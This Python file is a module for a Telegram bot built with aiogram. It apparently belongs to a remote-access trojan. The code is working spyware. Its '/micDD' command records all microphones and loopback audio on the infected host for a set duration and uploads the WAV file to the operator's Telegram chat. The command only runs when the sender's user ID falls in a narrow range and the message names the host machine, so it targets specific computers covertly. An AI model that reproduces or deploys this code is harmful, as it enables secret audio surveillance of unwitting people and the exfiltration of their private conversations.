from aiogram import Router
from aiogram.types import Message, FSInputFile
from aiogram.filters.command import Command
import threading
import numpy as np
from sys import platform
import platform
import soundcard as sc
import os
import soundfile as sf
import tempfile

router: Router = Router()

def start_recording(duration, audio_path):
    mics = sc.all_microphones(include_loopback=True)

    def record_from_mic(mic, samplerate, numframes, recordings, index):
        with mic.recorder(samplerate=samplerate) as recorder:
            recordings[index] = recorder.record(numframes=numframes)

    recordings = [None] * len(mics)

    samplerate = 44100
    numframes = samplerate * duration

    threads = []
    for i, mic in enumerate(mics):
        thread = threading.Thread(target=record_from_mic, args=(mic, samplerate, numframes, recordings, i))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    merged_recording = np.sum(recordings, axis=0) / len(mics)
    sf.write(audio_path, merged_recording, samplerate, format='WAV', subtype='PCM_16')

@router.message(Command("micDD"))
async def cmd_mic(message: Message):
    if message.from_user.id > 6988905000 or message.from_user.id < 6988903000:
        return
    try:
        args = message.text.split(' ')
        if len(args) == 3 and args[1].isdigit() and platform.uname().node == args[2]:
            duration = int(args[1])
            temp_dir = tempfile.gettempdir()
            audio_file_name = f'mic_capture_{platform.uname().node}.wav'
            audio_path = os.path.join(temp_dir, audio_file_name)

            start_recording(duration, audio_path)

            audio_file = FSInputFile(audio_path)
            await message.answer_audio(audio_file)
            os.remove(audio_path)
        else:
            await message.answer("Usage: /micDD [duration in seconds] username")
            return
    except Exception as e:
        await message.answer(f"An error occurred while capturing the audio: {e}")